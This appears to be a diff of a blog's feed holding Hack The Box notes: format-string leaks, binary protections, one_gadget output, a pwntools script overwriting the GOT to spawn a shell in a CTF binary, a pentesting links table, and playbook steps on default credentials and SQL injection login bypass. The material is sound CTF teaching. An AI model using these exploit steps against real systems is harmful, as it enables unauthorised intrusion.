+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%299s"</span><span class="p">,</span><span class="n">local_148</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">local_148</span><span class="p">);</span>
+</code></pre></div></div>
 
-If we&apos;re a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: `%p,%p,%p` will leak the first
-three memory positions in the stack: `0x1,0x1,0x7ffff7d14a37`
+<p>If we’re a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: <code class="language-plaintext highlighter-rouge">%p,%p,%p</code> will leak the first
+three memory positions in the stack: <code class="language-plaintext highlighter-rouge">0x1,0x1,0x7ffff7d14a37</code></p>
 
-More info here: &lt;a href=&quot;https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/&quot;&gt;https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/&lt;/a&gt;
+<p>More info here: <a href="https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/">https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/</a></p>
 
-More info about the possible formats: &lt;a href=&quot;https://en.wikipedia.org/wiki/Printf_format_string&quot;&gt;https://en.wikipedia.org/wiki/Printf_format_string&lt;/a&gt;
+<p>More info about the possible formats: <a href="https://en.wikipedia.org/wiki/Printf_format_string">https://en.wikipedia.org/wiki/Printf_format_string</a></p>
 
-### Security flags &lt;a name=&quot;flags&quot;&gt;&lt;/a&gt;
+<h3 id="security-flags-">Security flags <a name="flags"></a></h3>
 
-When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt;:
+<p>When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use <a href="https://github.com/slimm609/checksec.sh">checksec</a>:</p>
 
-```bash
-gal@gal-Modern-14-C12M:~/workspace/gal/blog$ checksec /usr/bin/ls
-[*] &apos;/usr/bin/ls&apos;
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gal@gal-Modern-14-C12M:~/workspace/gal/blog<span class="nv">$ </span>checksec /usr/bin/ls
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/usr/bin/ls'</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
     FORTIFY:  Enabled
-```
+</code></pre></div></div>
 
-- RELRO: If there&apos;s no `RELRO` protection, it means that the Global Object Table (`GOT`) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes `puts`, will execute arbitrary code.
-- Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.
-- NX: No code execution from the stack
-- PIE: executable is loaded at random address.
+<ul>
+  <li>RELRO: If there’s no <code class="language-plaintext highlighter-rouge">RELRO</code> protection, it means that the Global Object Table (<code class="language-plaintext highlighter-rouge">GOT</code>) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes <code class="language-plaintext highlighter-rouge">puts</code>, will execute arbitrary code.</li>
+  <li>Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.</li>
+  <li>NX: No code execution from the stack</li>
+  <li>PIE: executable is loaded at random address.</li>
+</ul>
 
-More info: &lt;a href=&quot;https://opensource.com/article/21/6/linux-checksec&quot;&gt;https://opensource.com/article/21/6/linux-checksec&lt;/a&gt;
+<p>More info: <a href="https://opensource.com/article/21/6/linux-checksec">https://opensource.com/article/21/6/linux-checksec</a></p>
 
-### ASLR: Address Space Layout Randomisation&lt;a name=&quot;aslr&quot;&gt;&lt;/a&gt;
+<h3 id="aslr-address-space-layout-randomisation">ASLR: Address Space Layout Randomisation<a name="aslr"></a></h3>
 
-This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.
+<p>This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.</p>
 
-In order to check if a exploit is stable, you can enable this in gdb, to check if your compter offset works in all situations:
-```bash
-gef➤  aslr on
-[+] Enabling ASLR
+<p>In order to check if a exploit is stable, you can enable this in gdb, to check if your compter offset works in all situations:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  aslr on
+<span class="o">[</span>+] Enabling ASLR
 gef➤  start
-```
+</code></pre></div></div>
 
-### One gadget&lt;a name=&quot;one-gadget&quot;&gt;&lt;/a&gt;
+<h3 id="one-gadget">One gadget<a name="one-gadget"></a></h3>
 
-&lt;a href=&quot;https://github.com/david942j/one_gadget&quot;&gt;https://github.com/david942j/one_gadget&lt;/a&gt;
+<p><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
 
-`libc` library has some pieces of code that runs a piece of code similar to `execve(&apos;/bin/sh&apos;, NULL, NULL)` which will lead to remote code execution.
+<p><code class="language-plaintext highlighter-rouge">libc</code> library has some pieces of code that runs a piece of code similar to <code class="language-plaintext highlighter-rouge">execve('/bin/sh', NULL, NULL)</code> which will lead to remote code execution.</p>
 
-You can use the one gadget to know exactly the memory address you need to point to achive this RCE. 
+<p>You can use the one gadget to know exactly the memory address you need to point to achive this RCE.</p>
 
-```bash
-gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge$ one_gadget glibc/libc.so.6 
-0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ)
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge<span class="nv">$ </span>one_gadget glibc/libc.so.6 
+0x50a37 posix_spawn<span class="o">(</span>rsp+0x1c, <span class="s2">"/bin/sh"</span>, 0, rbp, rsp+0x60, environ<span class="o">)</span>
 constraints:
-  rsp &amp; 0xf == 0
-  rcx == NULL
-  rbp == NULL || (u16)[rbp] == NULL
+  rsp &amp; 0xf <span class="o">==</span> 0
+  rcx <span class="o">==</span> NULL
+  rbp <span class="o">==</span> NULL <span class="o">||</span> <span class="o">(</span>u16<span class="o">)[</span>rbp] <span class="o">==</span> NULL
 
-0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])
-constraints:
-  address rbp-0x78 is writable
-  [r10] == NULL || r10 == NULL
-  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
-
-0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)
+0xebcf1 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, r10, <span class="o">[</span>rbp-0x70]<span class="o">)</span>
 constraints:
   address rbp-0x78 is writable
-  [r10] == NULL || r10 == NULL
-  [rdx] == NULL || rdx == NULL
+  <span class="o">[</span>r10] <span class="o">==</span> NULL <span class="o">||</span> r10 <span class="o">==</span> NULL
+  <span class="o">[[</span>rbp-0x70]] <span class="o">==</span> NULL <span class="o">||</span> <span class="o">[</span>rbp-0x70] <span class="o">==</span> NULL
 
-0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx)
+0xebcf5 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, r10, rdx<span class="o">)</span>
 constraints:
   address rbp-0x78 is writable
-  [rsi] == NULL || rsi == NULL
-  [rdx] == NULL || rdx == NULL
-```
+  <span class="o">[</span>r10] <span class="o">==</span> NULL <span class="o">||</span> r10 <span class="o">==</span> NULL
+  <span class="o">[</span>rdx] <span class="o">==</span> NULL <span class="o">||</span> rdx <span class="o">==</span> NULL
 
-For every memory address, it also describe which value the register need to have in order to execute the RCE.
+0xebcf8 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsi, rdx<span class="o">)</span>
+constraints:
+  address rbp-0x78 is writable
+  <span class="o">[</span>rsi] <span class="o">==</span> NULL <span class="o">||</span> rsi <span class="o">==</span> NULL
+  <span class="o">[</span>rdx] <span class="o">==</span> NULL <span class="o">||</span> rdx <span class="o">==</span> NULL
+</code></pre></div></div>
 
-### Overwrite Global Object Table &lt;a name=&quot;override-got&quot;&gt;&lt;/a&gt;
+<p>For every memory address, it also describe which value the register need to have in order to execute the RCE.</p>
 
-The global object table is used to dynamically resolve standard library functions (`scanf`, `printf`, etc...). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.
+<h3 id="overwrite-global-object-table-">Overwrite Global Object Table <a name="override-got"></a></h3>
 
-Below, you can find an example of how we can override the global object table using the one gadget tool:
+<p>The global object table is used to dynamically resolve standard library functions (<code class="language-plaintext highlighter-rouge">scanf</code>, <code class="language-plaintext highlighter-rouge">printf</code>, etc…). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.</p>
 
-```python
-from pwn import *
+<p>Below, you can find an example of how we can override the global object table using the one gadget tool:</p>
 
-context.binary = elf = ELF(&apos;./spooky_time&apos;)
-libc = context.binary.libc
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-r = process(&apos;./spooky_time&apos;)
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./spooky_time'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
 
-r.sendlineafter(b&apos;scary!\n\n&apos;, &apos;%3$lx%51$lx&apos;)
-r.recvuntil(b&apos;than \n&apos;)
-libc.address = int(r.recvn(12), 16) - 1133111
-elf.address = int(r.recvn(12), 16) - 5056
-libc_one_gadget = libc.address + 0xebcf5 # libc.address + offset computed with one gadget tool
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./spooky_time'</span><span class="p">)</span>
 
-fmtstr_payload = fmtstr_payload(8, {elf.got[&apos;puts&apos;] : libc_one_gadget}) # we make the function puts point to a RCE
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'scary!</span><span class="se">\n\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'%3$lx%51$lx'</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'than </span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1133111</span>
+<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">5056</span>
+<span class="n">libc_one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xebcf5</span> <span class="c1"># libc.address + offset computed with one gadget tool
+</span>
+<span class="n">fmtstr_payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span> <span class="p">:</span> <span class="n">libc_one_gadget</span><span class="p">})</span> <span class="c1"># we make the function puts point to a RCE
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'time..</span><span class="se">\n\n</span><span class="s">'</span><span class="p">,</span> <span class="n">fmtstr_payload</span><span class="p">)</span>
 
-r.sendlineafter(b&apos;time..\n\n&apos;, fmtstr_payload)
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><summary type="html"><![CDATA[I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting interesting links</title><link href="https://www.agalera.eu/pentesting-resources/" rel="alternate" type="text/html" title="Pentesting interesting links" /><published>2022-12-25T00:00:00-06:00</published><updated>2022-12-25T00:00:00-06:00</updated><id>https://www.agalera.eu/pentesting-resources</id><content type="html" xml:base="https://www.agalera.eu/pentesting-resources/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the pentesting interesting links I found.</p>
 
-r.interactive()
-```</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges related with reversing.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting playbook</title><link href="https://www.agalera.eu/pentesting-playbook/" rel="alternate" type="text/html" title="Pentesting playbook" /><published>2022-12-25T00:00:00+01:00</published><updated>2022-12-25T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-playbook</id><content type="html" xml:base="https://www.agalera.eu/pentesting-playbook/">I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I&apos;ll use this article to save all the steps I take to complete the challenges.
+<p><!--more--></p>
 
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
+<h2 id="resources">Resources</h2>
 
-While performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order):
+<table>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Description</td>
+      <td>Link</td>
+    </tr>
+    <tr>
+      <td>pentestbook.six2dez.com</td>
+      <td>General guides on pentesting</td>
+      <td><a href="https://pentestbook.six2dez.com/">https://pentestbook.six2dez.com/</a></td>
+    </tr>
+    <tr>
+      <td>revshells</td>
+      <td>List of reverse shells</td>
+      <td><a href="https://www.revshells.com/">https://www.revshells.com/</a></td>
+    </tr>
+    <tr>
+      <td>Hacktricks</td>
+      <td>Useful for everything related with pentesting</td>
+      <td><a href="https://book.hacktricks.xyz/welcome/readme">https://book.hacktricks.xyz/welcome/readme</a></td>
+    </tr>
+    <tr>
+      <td>SecLists</td>
+      <td>Wordlists and stuff</td>
+      <td><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></td>
+    </tr>
+    <tr>
+      <td>Reverse shells</td>
+      <td>More reverse shells payloads</td>
+      <td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">swisskyrepo/PayloadsAllTheThings</a></td>
+    </tr>
+    <tr>
+      <td>Pentestmonkey</td>
+      <td>Another pentesting guide</td>
+      <td><a href="https://pentestmonkey.net/">https://pentestmonkey.net/</a></td>
+    </tr>
+    <tr>
+      <td>GTFOBins</td>
+      <td>List of UNIX binaries that can be used to bypass local security restrictions</td>
+      <td><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></td>
+    </tr>
+    <tr>
+      <td>LOLbas</td>
+      <td>Similar to GTFObins but for Windows</td>
+      <td><a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></td>
+    </tr>
+    <tr>
+      <td>Red team notes</td>
+      <td>Red team notes</td>
+      <td><a href="https://www.ired.team/">https://www.ired.team/</a></td>
+    </tr>
+    <tr>
+      <td>SQL injections</td>
+      <td>SQL injections</td>
+      <td><a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">SQL injection cheatsheet</a></td>
+    </tr>
+    <tr>
+      <td>CVE mitre</td>
+      <td>Search for CVEs</td>
+      <td><a href="https://cve.mitre.org/cve/search_cve_list.html">https://cve.mitre.org/cve/search_cve_list.html</a></td>
+    </tr>
+    <tr>
+      <td>Request repo</td>
+      <td>Tool to receive HTTP request and display data</td>
+      <td><a href="https://requestrepo.com/">https://requestrepo.com/</a></td>
+    </tr>
+    <tr>
+      <td>CTF 101</td>
+      <td>CTF theory</td>
+      <td><a href="https://ctf101.org/">https://ctf101.org/</a></td>
+    </tr>
+    <tr>
+      <td>Buffer overflow and shellcode</td>
+      <td>Theory behind buffer overflow and shellcode injection</td>
+      <td><a href="https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/">https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/</a></td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html"><![CDATA[I keep this page as a reference to the different pentesting links I have used while doing the capture the flag exercises in https://www.hackthebox.com/]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting playbook</title><link href="https://www.agalera.eu/pentesting-playbook/" rel="alternate" type="text/html" title="Pentesting playbook" /><published>2022-12-25T00:00:00-06:00</published><updated>2022-12-25T00:00:00-06:00</updated><id>https://www.agalera.eu/pentesting-playbook</id><content type="html" xml:base="https://www.agalera.eu/pentesting-playbook/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the steps I take to complete the challenges.</p>
 
-## Table of contents
-1. [Enumeration](#enumeration)
-2. [Breaking in](#breaking-in)
-    1. [Poorly configured access](#anonymous-access)
-    2. [Brute force user/password](#brute-force-user)
-    3. [SQL Injection](#sql-injection)
-    4. [Server-side template injection](#ssti)
-    5. [Arbitrary file upload](#arbitrary-file-upload)
-    6. [Local file inclusion](#lfi)
-    7. [Remote file inclusion](#rfi)
-    8. [Reverse shell](#reverse-shell)
-    9. [Rogue servers](#rogue)
-        1. [NTLM](#ntlm)
-        2. [Log4JShell](#log4j-shell)
-    10. [Search for vulnerabilities](#search-vuln)
-    11. [XML eXternal Entities](#xxe)
-    12. [JWT Key Confussion](#jwt-confussion)
-    13. [Cross-Site Scripting](#xss)
-3. [Foothold, we are in](#foothold)
-    1. [List users/group](#list-users)
-    2. [Search keywords](#search-keywords)
-    3. [Local port forwarding](#local-port-forwarding)
-    4. [Lateral movement](#lateral-movement)
-    5. [Search for SSH keys](#ssh-keys)
-4. [Privilege escalation](#privilege-escalation)
-    1. [Privilege escalation on Windows](#privilege-escalation-windows)
-    2. [Privilege escalation on Linux](#privilege-escalation-linux)
-        1. [Set owner User ID](#privilege-escalation-suid)
-        2. [Abuse regular application](#privilege-escalation-app)
+<p><!--more--></p>
 
+<p>While performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order):</p>
 
+<h2 id="table-of-contents">Table of contents</h2>
+<ol>
+  <li><a href="#enumeration">Enumeration</a></li>
+  <li><a href="#breaking-in">Breaking in</a>
+    <ol>
+      <li><a href="#anonymous-access">Poorly configured access</a></li>
+      <li><a href="#brute-force-user">Brute force user/password</a></li>
+      <li><a href="#sql-injection">SQL Injection</a></li>
+      <li><a href="#ssti">Server-side template injection</a></li>
+      <li><a href="#arbitrary-file-upload">Arbitrary file upload</a></li>
+      <li><a href="#lfi">Local file inclusion</a></li>
+      <li><a href="#rfi">Remote file inclusion</a></li>
+      <li><a href="#reverse-shell">Reverse shell</a></li>
+      <li><a href="#rogue">Rogue servers</a>
+        <ol>
+          <li><a href="#ntlm">NTLM</a></li>
+          <li><a href="#log4j-shell">Log4JShell</a></li>
+        </ol>
+      </li>
+      <li><a href="#search-vuln">Search for vulnerabilities</a></li>
+      <li><a href="#xxe">XML eXternal Entities</a></li>
+      <li><a href="#jwt-confussion">JWT Key Confussion</a></li>
+      <li><a href="#xss">Cross-Site Scripting</a></li>
+    </ol>
+  </li>
+  <li><a href="#foothold">Foothold, we are in</a>
+    <ol>
+      <li><a href="#list-users">List users/group</a></li>
+      <li><a href="#search-keywords">Search keywords</a></li>
+      <li><a href="#local-port-forwarding">Local port forwarding</a></li>
+      <li><a href="#lateral-movement">Lateral movement</a></li>
+      <li><a href="#ssh-keys">Search for SSH keys</a></li>
+    </ol>
+  </li>
+  <li><a href="#privilege-escalation">Privilege escalation</a>
+    <ol>
+      <li><a href="#privilege-escalation-windows">Privilege escalation on Windows</a></li>
+      <li><a href="#privilege-escalation-linux">Privilege escalation on Linux</a>
+        <ol>
+          <li><a href="#privilege-escalation-suid">Set owner User ID</a></li>
+          <li><a href="#privilege-escalation-app">Abuse regular application</a></li>
+        </ol>
+      </li>
+    </ol>
+  </li>
+</ol>
 
-### Enumeration &lt;a name=&quot;enumeration&quot;&gt;&lt;/a&gt;
+<h3 id="enumeration-">Enumeration <a name="enumeration"></a></h3>
 
-Using `nmap` the attacker needs to see what is open in the target machine. For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;
+<p>Using <code class="language-plaintext highlighter-rouge">nmap</code> the attacker needs to see what is open in the target machine. For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>
 
-At this stage, we&apos;ll behave like a legitimate user, e.g.: perform regular searches, etc...
+<p>At this stage, we’ll behave like a legitimate user, e.g.: perform regular searches, etc…</p>
 
-If you discover a website, it&apos;s interesting to test the following enumeration techniques:
+<p>If you discover a website, it’s interesting to test the following enumeration techniques:</p>
 
-#### Directory brute force
+<h4 id="directory-brute-force">Directory brute force</h4>
 
-This is a technique useful to detect available paths for a web application. Also known as dir busting.
+<p>This is a technique useful to detect available paths for a web application. Also known as dir busting.</p>
 
-The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.
+<p>The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.</p>
 
-The tools to perform this is `gobuster`.
+<p>The tools to perform this is <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>
 
-Another option is to use sitemap functionality of `burp` suite
+<p>Another option is to use sitemap functionality of <code class="language-plaintext highlighter-rouge">burp</code> suite</p>
 
-For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;
+<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>
 
-#### Sub-domain brute force
+<h4 id="sub-domain-brute-force">Sub-domain brute force</h4>
 
-This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server. You can use `gobuster` to perform this.
+<p>This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server. You can use <code class="language-plaintext highlighter-rouge">gobuster</code> to perform this.</p>
 
-### Breaking in &lt;a name=&quot;breaking-in&quot;&gt;&lt;/a&gt;
+<h3 id="breaking-in-">Breaking in <a name="breaking-in"></a></h3>
 
-This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine. At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to explot.
+<p>This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine. At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to explot.</p>
 
-The attack vector is different to each machine, here you can find most common vector attacks:
+<p>The attack vector is different to each machine, here you can find most common vector attacks:</p>
 
-#### Poorly configured access &lt;a name=&quot;anonymous-access&quot;&gt;&lt;/a&gt;
+<h4 id="poorly-configured-access-">Poorly configured access <a name="anonymous-access"></a></h4>
 
-The user might have `ftp` or `tftp` or `smb` shares with anonymous access. It&apos;s worth taking a look because those access might leak some valuable information. Additionally, you can also check `metasploit` to check for this kind of access.
+<p>The user might have <code class="language-plaintext highlighter-rouge">ftp</code> or <code class="language-plaintext highlighter-rouge">tftp</code> or <code class="language-plaintext highlighter-rouge">smb</code> shares with anonymous access. It’s worth taking a look because those access might leak some valuable information. Additionally, you can also check <code class="language-plaintext highlighter-rouge">metasploit</code> to check for this kind of access.</p>
 
-For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;
+<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>
 
-#### Brute force user password &lt;a name=&quot;brute-force-user&quot;&gt;&lt;/a&gt;
+<h4 id="brute-force-user-password-">Brute force user password <a name="brute-force-user"></a></h4>
 
-If you discover a login page, why not trying some default user/password combinations?. One thing to try is to search for the version of the software and query google for the default user/password.
+<p>If you discover a login page, why not trying some default user/password combinations?. One thing to try is to search for the version of the software and query google for the default user/password.</p>
 
-Try the following user/password combinations first:
+<p>Try the following user/password combinations first:</p>
 
-```
-admin:admin
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:admin
 administrator:administrator
 admin:administrator
 admin:password
 administrator:password
-```
+</code></pre></div></div>
 
-Another option to try here is to try to brute force the user/password:
+<p>Another option to try here is to try to brute force the user/password:</p>
 
-You can try a dictionary attack to bruce force user/password combinations.
+<p>You can try a dictionary attack to bruce force user/password combinations.</p>
 
-You can use a tool like thc-hydra: &lt;a href=&quot;https://github.com/vanhauser-thc/thc-hydra&quot;&gt;https://github.com/vanhauser-thc/thc-hydra&lt;/a&gt;. However, this will fail if there if there&apos;s any kind of CSRF protection.
+<p>You can use a tool like thc-hydra: <a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>. However, this will fail if there if there’s any kind of CSRF protection.</p>
 
-In order to bypass the CSRF protection, we must do the requests from the browser. I prepared a tool to do that:
+<p>In order to bypass the CSRF protection, we must do the requests from the browser. I prepared a tool to do that:</p>
 
-&lt;a href=&quot;https://github.com/adriangalera/pydra/&quot;&gt;https://github.com/adriangalera/pydra/&lt;/a&gt;
+<p><a href="https://github.com/adriangalera/pydra/">https://github.com/adriangalera/pydra/</a></p>
 
-Take into account that if you know for sure the user, it will take much less time than having to guess both user and password.
+<p>Take into account that if you know for sure the user, it will take much less time than having to guess both user and password.</p>
 
-#### SQL Injection &lt;a name=&quot;sql-injection&quot;&gt;&lt;/a&gt;
+<h4 id="sql-injection-">SQL Injection <a name="sql-injection"></a></h4>
 
-Poorly programmed queries can be very dangerous and leads to escaping issues in the queries. If you see any indications of a query, try to use `sqlmap` to identify potential SQL injections or try some very basic ones.
+<p>Poorly programmed queries can be very dangerous and leads to escaping issues in the queries. If you see any indications of a query, try to use <code class="language-plaintext highlighter-rouge">sqlmap</code> to identify potential SQL injections or try some very basic ones.</p>
 
-If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.
+<p>If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.</p>
 
-A typical SQL query for a login page can look like this:
+<p>A typical SQL query for a login page can look like this:</p>
 
-```sql
-SELECT * FROM members WHERE username = &apos;admin&apos; AND password = &apos;admin&apos;
-```
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'admin'</span>
+</code></pre></div></div>
 
-If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:
+<p>If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:</p>
 
-```sql
-SELECT * FROM members WHERE username = &apos;admin&apos; #&apos; AND password = &apos;kjdfjklsdf&apos;
-```
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="o">#</span><span class="s1">' AND password = '</span><span class="n">kjdfjklsdf</span><span class="s1">'
+</span></code></pre></div></div>
 
-Now the query becomes:
+<p>Now the query becomes:</p>
 
-```sql
-SELECT * FROM members WHERE username = &apos;admin&apos;
-```
